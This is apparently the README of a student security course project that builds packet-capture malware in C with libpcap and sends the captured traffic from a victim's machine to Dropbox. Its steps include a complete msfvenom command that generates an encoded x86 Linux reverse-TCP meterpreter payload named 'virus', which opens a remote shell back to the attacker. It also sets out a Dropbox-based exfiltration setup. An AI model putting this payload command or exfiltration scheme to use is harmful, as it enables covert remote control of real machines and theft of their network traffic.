# CS460 Final Project

This project is a simple implementation of a packet capture malware. The malware is written in C and utilizes the libpcap library. 
In order to simulate how this malware could be placed on a victim's machine, Metasploit is used. 

## How To Use

1. [Download Metasploit](https://www.rapid7.com/products/metasploit/download/)

2. Create a Dropbox developer account, create an access token add it to your environment as "DROPBOX_ACCESS_TOKEN". 
   Dropbox is used for storing pcap files that have been created on the victim's machine.
   
3. Run ./build.sh to create the malware executable. The malware was only tested on Linux so it is advisable to only build it on Linux.

4. Move into the directory containing all the Metasploit binaries. This is typically /opt/metasploit-framework/bin/.
   Run the command below, which creates a binary version of an exploit that is placed on the victim's machine. 
   When this binary is executed, a meterpreter shell is started on your machine. More info on meterpreter shells can be found [here  (https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
   
   ./msfvenom -a x86 --platform linux -p x86/linux/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -e x86/shikata_ga_nai -f elf -o virus
